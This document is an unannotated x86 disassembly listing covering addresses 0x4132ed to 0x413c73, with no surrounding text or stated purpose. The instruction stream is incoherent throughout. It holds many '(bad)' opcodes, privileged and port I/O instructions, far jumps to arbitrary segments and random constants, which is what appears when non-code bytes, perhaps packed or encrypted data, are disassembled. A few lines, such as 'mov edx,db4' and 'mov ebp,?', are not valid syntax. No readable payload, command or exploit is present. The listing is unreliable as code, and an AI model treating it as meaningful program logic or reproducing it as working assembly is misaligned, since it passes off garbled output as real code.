  4132ed:	outs   dx,BYTE PTR ds:[esi]
  4132ee:	sub    ecx,DWORD PTR [esi]
  4132f0:	xchg   esp,eax
  4132f1:	sbb    esi,DWORD PTR [ecx+edx*4]
  4132f4:	inc    ebp
  4132f5:	cmp    al,ah
  4132f7:	repz xchg esp,eax
  4132f9:	idiv   BYTE PTR gs:[ebx]
  4132fc:	inc    esi
  4132fd:	jno    0x41335c
  4132ff:	pop    es
  413300:	or     DWORD PTR [ebx-0xbf3b82c],0xffffffd8
  413307:	jmp    0x8ac6:0x50b4f7ce
  41330e:	jne    0x413358
  413310:	dec    ecx
  413311:	jl     0x413360
  413313:	push   ds
  413314:	sbb    esi,DWORD PTR [ecx+0x5a]
  413317:	into   
  413318:	fld    DWORD PTR [eax+0x5b]
  41331b:	and    eax,0xe210990
  413320:	xchg   ebp,eax
  413321:	rcr    BYTE PTR [ebp+0x5c],1
  413324:	xor    ebp,DWORD PTR [edx+0x36]
  413327:	mov    ebp,0xbb5c8d69
  41332c:	dec    esp
  41332d:	jl     0x4133ae
  41332f:	jp     0x4132d3
  413331:	add    esp,esi
  413333:	jne    0x413364
  413335:	in     eax,0xf2
  413337:	jecxz  0x4133a6
  413339:	xor    edi,DWORD PTR [ebp+0x61]
  41333c:	sbb    DWORD PTR [ecx-0x24eb3f9e],0xf5b9e8f2
  413346:	cdq    
  413347:	retf   
  413348:	and    bh,BYTE PTR [eax]
  41334a:	rcr    DWORD PTR [ebp-0x705018ea],0x54
  413351:	add    al,0x8b
  413353:	inc    ebp
  413354:	mov    eax,0x8599d81b
  413359:	push   cs
  41335a:	adc    ebx,ebx
  41335c:	lea    esp,[eax]
  41335e:	loop   0x4132f5
  413360:	xchg   edx,eax
  413361:	out    0x27,eax
  413363:	iret   
  413364:	sti    
  413365:	aas    
  413366:	add    BYTE PTR [edx-0x8],bl
  413369:	(bad)  
  41336b:	sub    eax,0xf51614e
  413370:	dec    edx
  413371:	ret    
  413372:	in     eax,0xf2
  413374:	pop    edx
  413375:	jp     0x4133c5
  413377:	shl    eax,0x2e
  41337a:	(bad)  
  41337c:	mov    ch,0xbe
  41337e:	push   ebp
  41337f:	cwde   
  413380:	or     BYTE PTR [ebp-0x6],bh
  413383:	xchg   ecx,eax
  413384:	sbb    al,0x5f
  413386:	ret    0x32a7
  413389:	cmp    al,0xae
  41338b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41338c:	ins    BYTE PTR es:[edi],dx
  41338d:	mov    cl,0xe
  41338f:	retf   
  413390:	adc    BYTE PTR [ecx+0x1351b5fe],dl
  413396:	push   ds
  413397:	mov    bh,0x80
  413399:	lahf   
  41339a:	xlat   BYTE PTR ds:[ebx]
  41339b:	retf   
  41339c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41339d:	popf   
  41339e:	loope  0x4133c4
  4133a0:	in     al,0xe4
  4133a2:	fild   QWORD PTR [ecx+0x7]
  4133a5:	add    DWORD PTR [eax],0xd8775996
  4133ab:	sbb    BYTE PTR [eax-0xb20b675],0x53
  4133b2:	div    BYTE PTR [ecx+0x54913cf0]
  4133b8:	push   esp
  4133b9:	ss cld 
  4133bb:	scas   al,BYTE PTR es:[edi]
  4133bc:	pusha  
  4133bd:	mov    al,0x17
  4133bf:	jnp    0x4133a6
  4133c1:	mov    dl,BYTE PTR [ebp+0x34]
  4133c4:	(bad)  
  4133c5:	aaa    
  4133c6:	sahf   
  4133c7:	adc    esp,DWORD PTR cs:[edi]
  4133ca:	or     eax,0xc1d6784d
  4133cf:	or     bl,BYTE PTR [ebp+0x4d1932f3]
  4133d5:	outs   dx,BYTE PTR ds:[esi]
  4133d6:	cmp    al,0x12
  4133d8:	push   edx
  4133d9:	cdq    
  4133da:	lods   eax,DWORD PTR ds:[esi]
  4133db:	sub    al,0x71
  4133dd:	dec    edx
  4133de:	retf   0xdf38
  4133e1:	mov    ebp,0x6cf59681
  4133e6:	icebp  
  4133e7:	cmc    
  4133e8:	(bad)  
  4133ea:	push   cs
  4133eb:	xchg   ebp,eax
  4133ec:	cli    
  4133ed:	push   edi
  4133ee:	and    eax,0x84364df
  4133f3:	xor    BYTE PTR [edi+0x4a9a4c50],bl
  4133f9:	xor    edx,DWORD PTR [esi-0x5a230512]
  4133ff:	push   0x427b0f44
  413404:	or     BYTE PTR [edx-0x1a],bh
  413407:	in     eax,0x23
  413409:	xor    eax,DWORD PTR ds:0xcf41f5a0
  41340f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413410:	(bad)  
  413412:	jp     0x4133b8
  413414:	jb     0x4133f6
  413416:	jo     0x413467
  413418:	(bad)  
  413419:	fnstcw WORD PTR [esi+0x18]
  41341c:	std    
  41341d:	stos   BYTE PTR es:[edi],al
  41341e:	pop    esi
  41341f:	mov    ebx,0x38852353
  413424:	cmp    ch,BYTE PTR [eax-0x28]
  413427:	dec    edi
  413428:	xor    ebx,ebx
  41342a:	mov    BYTE PTR [edx+0x379aaf44],al
  413430:	inc    esp
  413431:	out    dx,al
  413432:	fld    TBYTE PTR [eax+0x5d]
  413435:	ret    0xc0b
  413438:	xadd   BYTE PTR [edi],bh
  41343b:	fsubr  QWORD PTR [edx-0x47d2ec86]
  413441:	cmp    al,0x2a
  413443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413444:	xchg   ecx,eax
  413445:	stos   BYTE PTR es:[edi],al
  413446:	mov    dh,0x6f
  413448:	jp     0x41348a
  41344a:	repnz aas 
  41344c:	inc    edx
  41344d:	pop    eax
  41344e:	in     al,0x3c
  413450:	mov    bh,0x28
  413452:	cmp    DWORD PTR [esi-0x75417d94],esi
  413458:	daa    
  413459:	(bad)  
  41345b:	jmp    0x3756:0xebc7fd8
  413462:	cld    
  413463:	outs   dx,BYTE PTR ds:[esi]
  413464:	sbb    BYTE PTR [eax-0x8],ch
  413467:	(bad)  
  413468:	stos   DWORD PTR es:[edi],eax
  413469:	sbb    DWORD PTR [edx-0xfe52248],ebx
  41346f:	jb     0x41348a
  413471:	jl     0x4134d5
  413473:	sbb    bl,BYTE PTR [eax+eax*8]
  413476:	xchg   BYTE PTR [edi],cl
  413478:	jmp    0x4133fb
  41347a:	add    BYTE PTR [eax-0x32],cl
  41347d:	or     al,0xd3
  41347f:	jne    0x41349d
  413481:	in     al,dx
  413482:	inc    esi
  413483:	icebp  
  413484:	dec    edi
  413485:	lods   al,BYTE PTR ds:[esi]
  413486:	out    dx,eax
  413487:	scas   eax,DWORD PTR es:[edi]
  413488:	xor    eax,DWORD PTR [ebp-0x2a]
  41348b:	add    al,0xaa
  41348d:	bound  esi,QWORD PTR [eax+0x549fee72]
  413493:	mov    edi,0x33239951
  413498:	cmp    al,0xb2
  41349a:	fisttp QWORD PTR ds:0x6c6559fe
  4134a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134a1:	(bad)  
  4134a2:	pop    ebx
  4134a3:	(bad)  
  4134a4:	mov    ch,0x71
  4134a6:	ins    DWORD PTR es:[edi],dx
  4134a7:	jge    0x4134fe
  4134a9:	adc    bl,bl
  4134ab:	lock dec ecx
  4134ad:	(bad)  
  4134ae:	push   esp
  4134af:	fs sti 
  4134b1:	imul   esi,DWORD PTR [edx],0xfa30f37b
  4134b7:	cmp    BYTE PTR [eax+0x4f5b95e0],bh
  4134bd:	addr16 fcomip st,st(2)
  4134c0:	mov    esi,0xdd0e49d6
  4134c5:	mov    ecx,es
  4134c7:	cmp    BYTE PTR [esp+eax*2],0x5d
  4134cb:	imul   esp,DWORD PTR [edi],0x628b4451
  4134d1:	pusha  
  4134d2:	test   eax,0x8e4a062a
  4134d7:	mov    WORD PTR [ebp+0x7db474b8],gs
  4134dd:	ins    DWORD PTR es:[edi],dx
  4134de:	and    al,0xb4
  4134e0:	pushf  
  4134e1:	(bad)  
  4134e2:	push   esp
  4134e3:	mov    es,WORD PTR [edx-0x5a]
  4134e6:	xchg   BYTE PTR [ebp+ebp*8+0x17],ch
  4134ea:	leave  
  4134eb:	xchg   esi,eax
  4134ec:	and    DWORD PTR ds:0xb9127cba,ecx
  4134f2:	fiadd  WORD PTR [ebx+eax*2]
  4134f5:	xor    bh,BYTE PTR [ebx-0x4a]
  4134f8:	ins    DWORD PTR es:[edi],dx
  4134f9:	adc    eax,0x5b4e647d
  4134fe:	jg     0x41352d
  413500:	das    
  413501:	jno    0x413555
  413503:	mov    ecx,esp
  413505:	inc    ebp
  413506:	mov    bl,0xfe
  413508:	dec    edi
  413509:	push   esp
  41350a:	jp     0x413491
  41350c:	push   eax
  41350d:	jmp    DWORD PTR [esi]
  41350f:	out    0x2d,al
  413511:	nop
  413512:	test   BYTE PTR [ebp+0x23],al
  413515:	jbe    0x4134d1
  413517:	sub    eax,0xc03e105a
  41351c:	das    
  41351d:	or     ah,0xd8
  413520:	mov    ah,0x12
  413522:	xor    DWORD PTR [ebp+0x77253603],0x2c
  413529:	test   ebp,esp
  41352b:	mov    edx,db4
  41352e:	hlt    
  41352f:	mov    al,0xc9
  413531:	add    eax,0x1495a5b6
  413536:	leave  
  413537:	pop    ss
  413538:	xor    DWORD PTR [esi+eiz*1-0x27b09fbc],edi
  41353f:	push   0x2d8b2498
  413544:	movaps xmm2,XMMWORD PTR [ebx+0x34a6ddc3]
  41354b:	jl     0x41359c
  41354d:	mov    eax,ds:0xb2cf319f
  413552:	mov    ds:0x9d3e927f,eax
  413557:	sub    eax,0x48d98b21
  41355c:	ja     0x41352d
  41355e:	out    dx,al
  41355f:	mov    cl,0xfb
  413561:	and    bl,BYTE PTR [esi-0x12232c2a]
  413567:	xchg   esi,eax
  413568:	and    eax,DWORD PTR cs:[ecx-0x39008c4d]
  41356f:	leave  
  413570:	and    al,0x18
  413572:	cwde   
  413573:	addr16 pop es
  413575:	jb     0x41352b
  413577:	rol    BYTE PTR ds:0xa701a106,cl
  41357d:	xor    DWORD PTR [edx-0x225eefbd],ebx
  413583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413584:	repnz cld 
  413586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413587:	sub    eax,0x73077f11
  41358c:	add    BYTE PTR [edi-0x74],0x4a
  413590:	and    BYTE PTR [eax+eiz*8],ch
  413593:	test   al,0xd3
  413595:	fst    DWORD PTR [eax-0x62dea8b8]
  41359b:	push   esi
  41359c:	jmp    0x47cc:0xec11c4ab
  4135a3:	in     eax,0xce
  4135a5:	jle    0x41359d
  4135a7:	sub    al,0xe1
  4135a9:	test   al,0xff
  4135ab:	repz xor BYTE PTR [edi+edx*4-0x34],bh
  4135b0:	add    ecx,DWORD PTR ds:0xef803a17
  4135b6:	pop    edx
  4135b7:	or     al,BYTE PTR [ebx-0x66]
  4135ba:	mov    ebx,0x1bee174a
  4135bf:	aaa    
  4135c0:	sar    DWORD PTR [ebp-0x2a],cl
  4135c3:	cli    
  4135c4:	mov    esp,0x3d9f959b
  4135c9:	jnp    0x4135b0
  4135cb:	fs daa 
  4135cd:	sbb    ebp,edi
  4135cf:	(bad)  
  4135d1:	xor    bh,BYTE PTR [edi+0x1c]
  4135d4:	inc    esi
  4135d5:	(bad)  
  4135d6:	daa    
  4135d7:	mov    eax,0xdd718c0
  4135dc:	fidiv  DWORD PTR [edx+esi*2-0x3e]
  4135e0:	test   ch,0xc3
  4135e3:	mov    BYTE PTR [esi+0x39],dh
  4135e6:	pop    eax
  4135e7:	add    al,0x36
  4135e9:	rol    esp,1
  4135eb:	push   ds
  4135ec:	sti    
  4135ed:	push   ds
  4135ee:	pop    eax
  4135ef:	loope  0x41362a
  4135f1:	jp     0x413642
  4135f3:	(bad)  
  4135f4:	bound  ecx,QWORD PTR [ebx+ebp*4+0x74557235]
  4135fb:	je     0x4135b6
  4135fd:	inc    esp
  4135fe:	iret   
  4135ff:	or     DWORD PTR [ebp-0x7f4daa46],edi
  413605:	sbb    BYTE PTR [ecx+0x9],ch
  413608:	jno    0x4135c5
  41360a:	mov    dl,0x71
  41360c:	rcr    DWORD PTR [ebp+0x31],1
  41360f:	aas    
  413610:	jecxz  0x4135ca
  413612:	int3   
  413613:	push   cs
  413614:	jae    0x4135c2
	...
  4137e6:	jecxz  0x413807
  4137e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e9:	adc    al,0xfe
  4137eb:	mov    ebp,0x9faffff3
  4137f0:	test   ah,0x24
  4137f3:	daa    
  4137f4:	loope  0x4137af
  4137f6:	popf   
  4137f7:	add    DWORD PTR ss:[eax],eax
  4137fa:	push   ds
  4137fb:	pop    es
  4137fc:	add    BYTE PTR [eax],al
  4137fe:	and    eax,0x71dd397d
  413803:	shl    BYTE PTR [ebp-0x2b2269f5],0xfb
  41380a:	repz inc esi
  41380c:	mov    ah,0x34
  41380e:	sub    edx,DWORD PTR [ebp-0x1390c4c]
  413814:	out    dx,eax
  413815:	je     0x4137b4
  413817:	clc    
  413818:	jg     0x41381d
  41381a:	xchg   ebx,eax
  41381b:	(bad)  
  41381c:	int    0xc0
  41381e:	inc    ecx
  41381f:	(bad)  
  413820:	iret   
  413821:	mov    ebp,?
  413823:	push   edi
  413824:	jae    0x41386b
  413826:	xor    BYTE PTR [edx+0x207dbb8e],bl
  41382c:	ja     0x41380a
  41382e:	scas   al,BYTE PTR es:[edi]
  41382f:	add    BYTE PTR [ecx+0x3fc1abb],0x7
  413836:	shl    BYTE PTR [edi],0xd1
  413839:	retf   
  41383a:	fsub   st,st(3)
  41383c:	nop
  41383d:	popa   
  41383e:	sbb    bh,ah
  413840:	or     bl,BYTE PTR [ebx+0x73338a57]
  413846:	jg     0x413898
  413848:	out    0xca,al
  41384a:	xchg   DWORD PTR [bx+di-0x4],ecx
  41384e:	inc    ebx
  41384f:	ins    DWORD PTR es:[di],dx
  413851:	mov    eax,0x75697e10
  413856:	(bad)  
  413857:	dec    esi
  413858:	scas   al,BYTE PTR es:[edi]
  413859:	jmp    0xc705:0x5e38b416
  413860:	inc    esi
  413861:	mov    eax,0x75b6108d
  413866:	sub    BYTE PTR [edx],bl
  413868:	into   
  413869:	cmp    edx,DWORD PTR [ebx+0x5]
  41386c:	stos   BYTE PTR es:[edi],al
  41386d:	xor    edi,DWORD PTR [esp+ecx*4]
  413870:	(bad)  
  413871:	cmp    al,0x8a
  413873:	ror    BYTE PTR [ebx],0xef
  413876:	add    al,BYTE PTR [edx-0x16]
  413879:	inc    edx
  41387a:	and    eax,0x1bf72619
  41387f:	lods   eax,DWORD PTR ds:[esi]
  413880:	mov    ds:0xceb0c110,al
  413885:	pop    eax
  413886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413887:	fisub  DWORD PTR [ecx-0xf]
  41388a:	js     0x4138b6
  41388c:	pmulhw mm7,QWORD PTR [edi]
  41388f:	mov    edx,0xc2b8473
  413894:	pop    es
  413895:	out    0x35,al
  413897:	and    al,0xa0
  413899:	ret    0xa9de
  41389c:	inc    esp
  41389d:	pop    ebp
  41389e:	fidivr DWORD PTR [edx-0x5a3028b0]
  4138a4:	fsub   DWORD PTR [edi]
  4138a6:	adc    ecx,DWORD PTR [ebx-0x60a93661]
  4138ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ad:	into   
  4138ae:	outs   dx,BYTE PTR ds:[esi]
  4138af:	xor    DWORD PTR [edx],edi
  4138b1:	ss xchg edx,eax
  4138b3:	pop    es
  4138b4:	adc    DWORD PTR [esi],esi
  4138b6:	into   
  4138b7:	stos   BYTE PTR es:[edi],al
  4138b8:	xsavec [ecx-0x53]
  4138bc:	(bad)  
  4138bd:	lahf   
  4138be:	mov    ebp,0x92bf69b1
  4138c3:	retf   0x851c
  4138c6:	sbb    al,0x9d
  4138c8:	addr16 je 0x4138a8
  4138cb:	lods   al,BYTE PTR ds:[esi]
  4138cc:	icebp  
  4138cd:	stos   DWORD PTR es:[edi],eax
  4138ce:	lea    ecx,[esi+0x71602f4f]
  4138d4:	mov    ch,0x19
  4138d6:	pop    edi
  4138d7:	daa    
  4138d8:	pop    ss
  4138d9:	bound  eax,QWORD PTR [eax-0x7a65ca9b]
  4138df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138e0:	xor    dl,BYTE PTR [edx]
  4138e2:	sub    eax,0x7e3a404d
  4138e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138e8:	xor    eax,0xab83b168
  4138ed:	out    dx,eax
  4138ee:	dec    esp
  4138ef:	ret    
  4138f0:	and    dh,ah
  4138f2:	xchg   ecx,eax
  4138f3:	xlat   BYTE PTR ds:[ebx]
  4138f4:	dec    eax
  4138f5:	out    dx,eax
  4138f6:	rcr    DWORD PTR [eax+0x48403b02],cl
  4138fc:	addr16 mov edx,cr3
  413900:	ja     0x413951
  413902:	ror    dh,1
  413904:	push   ds
  413905:	hlt    
  413906:	mov    eax,ds:0x69d481f4
  41390b:	mov    dl,BYTE PTR [edx-0x6a9de77d]
  413911:	pop    edi
  413912:	hlt    
  413913:	imul   ebp,DWORD PTR ds:0xc2bcf2bb,0xffffffbf
  41391a:	out    0x5d,al
  41391c:	out    0x9d,eax
  41391e:	mov    ebp,0x41e456ee
  413923:	dec    esp
  413924:	xchg   edx,eax
  413925:	mov    eax,0x9058687b
  41392a:	mov    bl,0x80
  41392c:	pop    edx
  41392d:	jle    0x413960
  41392f:	mov    dl,0x2f
  413931:	jmp    0x82b10fed
  413936:	mov    cl,0x4f
  413938:	dec    BYTE PTR [ebx+0x37]
  41393b:	mov    dl,BYTE PTR [edx-0xa]
  41393e:	add    DWORD PTR [edi+0x4bc96a90],ebp
  413944:	mov    ecx,DWORD PTR [eax]
  413946:	adc    cl,BYTE PTR [edi+ecx*1+0x7c]
  41394a:	idiv   DWORD PTR [edx-0xdb2ce6d]
  413950:	unpcklps xmm3,XMMWORD PTR [ecx-0x47]
  413954:	fdivr  QWORD PTR [ebx]
  413956:	int3   
  413957:	pop    edi
  413958:	xor    al,BYTE PTR [ecx+0x57]
  41395b:	add    DWORD PTR [esi],eax
  41395d:	xchg   ebp,eax
  41395e:	(bad)  
  413960:	in     eax,0x27
  413962:	inc    esi
  413963:	(bad)  
  413964:	or     ebx,ebp
  413966:	inc    ebx
  413968:	dec    ebx
  413969:	cdq    
  41396a:	or     edx,edx
  41396c:	loopne 0x4139ac
  41396e:	fisub  WORD PTR [edi]
  413970:	mov    ebx,0x317b1718
  413975:	adc    eax,0xc5de9476
  41397a:	hlt    
  41397b:	data16 jbe 0x4139f8
  41397e:	and    ebx,edi
  413980:	mov    edx,0x896755c5
  413985:	cdq    
  413986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413987:	ss scas eax,DWORD PTR es:[edi]
  413989:	cmp    eax,0x8cd1b17b
  41398e:	jg     0x41397b
  413990:	sar    BYTE PTR [esi+0x4615b998],cl
  413996:	or     DWORD PTR [eax],esi
  413998:	shl    ebp,cl
  41399a:	aam    0xaf
  41399c:	dec    ebx
  41399d:	inc    ecx
  41399e:	nop
  41399f:	stos   DWORD PTR es:[edi],eax
  4139a0:	dec    BYTE PTR [edx+0x44]
  4139a3:	(bad)  
  4139a4:	adc    DWORD PTR [ebx+0x64],edx
  4139a7:	xchg   ebp,eax
  4139a8:	sub    cl,BYTE PTR [esi-0x20]
  4139ab:	xor    al,dl
  4139ad:	test   eax,0xcd3bb1db
  4139b2:	adc    BYTE PTR [ebx+0x11],ch
  4139b5:	fs cbw 
  4139b8:	popa   
  4139b9:	imul   esp,DWORD PTR [ecx-0x1f],0x21
  4139bd:	enter  0x1ad,0x5e
  4139c1:	gs sbb al,0x89
  4139c4:	jp     0x413988
  4139c6:	enter  0x214f,0xbb
  4139ca:	cmp    DWORD PTR ds:0x55d0e2cc,ebp
  4139d0:	pop    esi
  4139d1:	jbe    0x413a2b
  4139d3:	shl    BYTE PTR [ecx+0x15fdf0a0],cl
  4139d9:	les    esp,FWORD PTR [eax+0x11]
  4139dc:	xchg   DWORD PTR [bx+si+0xde1],ebp
  4139e1:	or     al,0x28
  4139e3:	arpl   WORD PTR [ebx-0x3b],si
  4139e6:	pop    ebx
  4139e7:	cli    
  4139e8:	jl     0x41397c
  4139ea:	ja     0x4139c5
  4139ec:	mov    eax,ds:0xed875ee6
  4139f1:	retf   0xb2b8
  4139f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f5:	dec    ebp
  4139f6:	cmp    eax,DWORD PTR [esi-0x1e1b8255]
  4139fc:	rcr    BYTE PTR [ebx-0x80],cl
  4139ff:	scas   eax,DWORD PTR es:[edi]
  413a00:	test   BYTE PTR [eax-0x7283cca5],al
  413a06:	nop
  413a07:	ds in  eax,dx
  413a09:	dec    edi
  413a0a:	ror    BYTE PTR [eax+eiz*2],1
  413a0d:	daa    
  413a0e:	adc    edi,DWORD PTR [ebp+ebp*8+0x29]
  413a12:	xor    BYTE PTR [eax+0x8],al
  413a15:	xchg   esp,eax
  413a16:	mov    edi,0xffbb437b
  413a1b:	xor    DWORD PTR [ebx-0x1b9a09b4],0x54
  413a22:	daa    
  413a23:	jne    0x413a4b
  413a25:	or     DWORD PTR [edx+esi*8],esi
  413a28:	aaa    
  413a29:	adc    al,0xc0
  413a2b:	and    eax,0xca9c10c2
  413a30:	loopne 0x413a76
  413a32:	inc    BYTE PTR [edi+0x44]
  413a35:	test   DWORD PTR [ecx],0xc1e29d54
  413a3b:	mov    dl,0xac
  413a3d:	add    esp,DWORD PTR [eax+0x13b88789]
  413a43:	loopne 0x413a56
  413a45:	mov    ch,0x5c
  413a47:	repnz pop ebx
  413a49:	in     eax,dx
  413a4a:	mov    DWORD PTR [ebx],ebp
  413a4c:	ja     0x413ab9
  413a4e:	retf   0xe353
  413a51:	pop    es
  413a52:	jp     0x413a5a
  413a54:	test   BYTE PTR [edi-0x52],dl
  413a57:	lods   al,BYTE PTR ds:[esi]
  413a58:	push   esi
  413a59:	call   0xbff5e26d
  413a5e:	fisttp WORD PTR [esi]
  413a60:	add    eax,0x71ff278d
  413a65:	or     eax,0x48dbd9
  413a6a:	mov    al,ds:0x92463f99
  413a6f:	mov    eax,ds:0x68ca82f1
  413a74:	ffree  st(3)
  413a76:	mov    esp,DWORD PTR [edx+ecx*4-0x522c92e0]
  413a7d:	inc    ebx
  413a7e:	sbb    BYTE PTR [ecx-0x669a5496],dh
  413a84:	outs   dx,DWORD PTR ds:[esi]
  413a85:	push   ss
  413a86:	push   eax
  413a87:	fs ins DWORD PTR es:[edi],dx
  413a89:	fwait
  413a8a:	sbb    ebp,0x1acf6620
  413a90:	aam    0xcb
  413a92:	dec    edx
  413a93:	jb     0x413a60
  413a95:	push   ebp
  413a96:	daa    
  413a97:	fisub  WORD PTR [ebp+0x761dc713]
  413a9d:	lods   al,BYTE PTR ds:[esi]
  413a9e:	add    eax,DWORD PTR [eax-0x63a84f62]
  413aa4:	mov    ebp,0x55ecbaf3
  413aa9:	je     0x413ae4
  413aab:	imul   esi,DWORD PTR [ecx+0x7f94ef34],0x353ad755
  413ab5:	pop    ecx
  413ab6:	loopne 0x413a96
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	push   esp
  413abb:	mov    edx,DWORD PTR [ebp-0x4a]
  413abe:	std    
  413abf:	add    eax,0xbbb0b6f6
  413ac4:	cli    
  413ac5:	jne    0x413ab0
  413ac7:	add    eax,0x178c9824
  413acd:	mov    esp,0xd190a350
  413ad2:	push   0xe7a05bb9
  413ad7:	shl    DWORD PTR [edi+0x3d],0x28
  413adb:	adc    al,0x4
  413add:	xor    BYTE PTR [ecx-0x5c],dl
  413ae0:	pop    esi
  413ae1:	dec    esi
  413ae2:	dec    edi
  413ae3:	loop   0x413a97
  413ae5:	cwde   
  413ae6:	xor    DWORD PTR [ebx+0x1996f3a6],esi
  413aec:	jns    0x413aa9
  413aee:	loope  0x413b42
  413af0:	rcr    BYTE PTR [esi],cl
  413af2:	out    dx,eax
  413af3:	(bad)  
  413af4:	cmp    al,0x6
  413af6:	shl    BYTE PTR [edx+edi*1+0x31],cl
  413afa:	js     0x413aae
  413afc:	pop    eax
  413afd:	mov    al,ds:0x419cd2f8
  413b02:	wrmsr  
  413b04:	mov    eax,0x31ca3503
  413b09:	mov    edx,0x36376f30
  413b0e:	test   ch,ah
  413b10:	fcomp  DWORD PTR [edi-0x55]
  413b13:	cli    
  413b14:	jns    0x413aa3
  413b16:	pusha  
  413b17:	jl     0x413b4f
  413b19:	das    
  413b1a:	stos   DWORD PTR es:[edi],eax
  413b1b:	push   ebx
  413b1c:	dec    esi
  413b1d:	mov    ebp,0x76af0ea6
  413b22:	fldenv [ebx+0x3a01f672]
  413b28:	jmp    0xeff1:0x65f2300d
  413b2f:	jecxz  0x413b19
  413b31:	inc    ebp
  413b32:	pop    ds
  413b33:	(bad)  
  413b35:	(bad)  
  413b36:	xchg   ebx,eax
  413b37:	cmovne esi,DWORD PTR [esi+0x2ac5cdbb]
  413b3e:	in     al,0x8d
  413b40:	adc    edx,ecx
  413b42:	ins    DWORD PTR es:[edi],dx
  413b43:	outs   dx,BYTE PTR ds:[esi]
  413b44:	jnp    0x413b36
  413b46:	push   edi
  413b48:	jp     0x413b7c
  413b4a:	outs   dx,BYTE PTR ds:[esi]
  413b4b:	mov    al,ds:0x8000d083
  413b50:	pop    es
  413b51:	mov    ds:0x822d117,al
  413b56:	cmp    al,0x18
  413b58:	inc    ebp
  413b59:	aaa    
  413b5a:	dec    edx
  413b5b:	sbb    al,0x90
  413b5d:	dec    esi
  413b5e:	inc    eax
  413b5f:	cmp    eax,0x1a7b1dbe
  413b64:	mov    bl,0xd2
  413b66:	adc    BYTE PTR [edi+0x78501b43],0x74
  413b6d:	stos   BYTE PTR es:[edi],al
  413b6e:	es adc al,0x2
  413b71:	mov    ds:0x75547a3e,al
  413b76:	push   ebx
  413b77:	push   es
  413b78:	div    DWORD PTR [edx]
  413b7a:	aas    
  413b7b:	stc    
  413b7c:	stos   BYTE PTR es:[edi],al
  413b7d:	int    0xb2
  413b7f:	xchg   DWORD PTR [edi-0x1b],esi
  413b82:	enter  0xe109,0x2b
  413b86:	aas    
  413b87:	loope  0x413b9a
  413b89:	push   ebx
  413b8a:	sar    BYTE PTR [ecx+0x69],cl
  413b8d:	and    ecx,DWORD PTR [eax+0x47]
  413b90:	push   ds
  413b91:	repz inc esi
  413b93:	mov    esi,0x7e930c4a
  413b98:	mov    WORD PTR [edi-0x7a],ss
  413b9b:	mov    bh,ah
  413b9d:	fwait
  413b9e:	jo     0x413c10
  413ba0:	mov    dl,0x52
  413ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ba3:	outs   dx,BYTE PTR ds:[esi]
  413ba4:	es pop edx
  413ba6:	(bad)  
  413ba7:	push   es
  413ba8:	ins    BYTE PTR es:[edi],dx
  413ba9:	frndint 
  413bab:	pop    edx
  413bac:	sahf   
  413bad:	dec    BYTE PTR ds:0xe6ba4e8
  413bb3:	stos   BYTE PTR es:[edi],al
  413bb4:	inc    edi
  413bb5:	xor    eax,edx
  413bb7:	add    BYTE PTR [esp+esi*1],0xbd
  413bbb:	or     bh,BYTE PTR [edx+0x1407617e]
  413bc1:	sbb    BYTE PTR [ebp+eiz*1+0x34d33246],bl
  413bc8:	inc    ecx
  413bc9:	mov    al,ds:0x1135805e
  413bce:	jp     0x413b9f
  413bd0:	xchg   edx,eax
  413bd1:	lea    ebx,[ebx]
  413bd3:	adc    eax,0x552dffe7
  413bd8:	jb     0x413bc9
  413bda:	jecxz  0x413bae
  413bdc:	adc    BYTE PTR [edx],dl
  413bde:	cmp    BYTE PTR [eax+0xe580ac6],cl
  413be4:	mov    bl,0x71
  413be6:	sbb    ecx,DWORD PTR [ebp-0x45]
  413be9:	mov    eax,0xe17b962d
  413bee:	mov    ah,0xdc
  413bf0:	pop    ebp
  413bf1:	dec    edx
  413bf2:	sbb    al,0x1a
  413bf4:	xor    DWORD PTR [ecx+ebp*4],0x78
  413bf8:	xor    bl,BYTE PTR [ebp+0x6304b3f3]
  413bfe:	jne    0x413c66
  413c00:	mov    ds:0xf409772e,eax
  413c05:	inc    esp
  413c06:	mov    esi,0x79e483e4
  413c0b:	jne    0x413bf1
  413c0d:	mov    bl,0x23
  413c0f:	mov    eax,ds:0xee96325c
  413c14:	rol    DWORD PTR [eax+0x1ee69c3f],1
  413c1a:	dec    ecx
  413c1b:	jb     0x413be7
  413c1d:	adc    eax,0x1b0c0085
  413c22:	inc    esp
  413c23:	aas    
  413c24:	(bad)  
  413c25:	call   0xb14e4db5
  413c2a:	xlat   BYTE PTR ds:[ebx]
  413c2b:	jmp    0xb927:0x994d9525
  413c32:	mov    ch,0xbc
  413c34:	lock cmp al,0x70
  413c37:	pop    es
  413c38:	push   ss
  413c39:	and    eax,0x150e2fe8
  413c3e:	pop    ebx
  413c3f:	test   BYTE PTR [ebp-0x1b],dl
  413c42:	mov    bl,BYTE PTR [edx-0x35d7a69]
  413c48:	inc    ebp
  413c49:	inc    ebp
  413c4a:	rcl    dl,1
  413c4c:	out    0xe1,eax
  413c4e:	retf   0x76b3
  413c51:	ss dec ebp
  413c53:	daa    
  413c54:	add    BYTE PTR [ebx],cl
  413c56:	or     bl,cl
  413c58:	pop    ebp
  413c59:	(bad)  
  413c5a:	ss call 0x24c:0xb14e9e53
  413c62:	std    
  413c63:	lods   eax,DWORD PTR ds:[esi]
  413c64:	lods   eax,DWORD PTR ds:[esi]
  413c65:	xor    cl,BYTE PTR [esi-0x3c]
  413c68:	repnz pop edi
  413c6a:	mov    ds:0x6aa99f0b,eax
  413c6f:	cmc    
  413c70:	dec    ebx
  413c71:	push   edi
  413c72:	dec    edx
  413c73:	ins    DWORD PTR es:[edi],dx
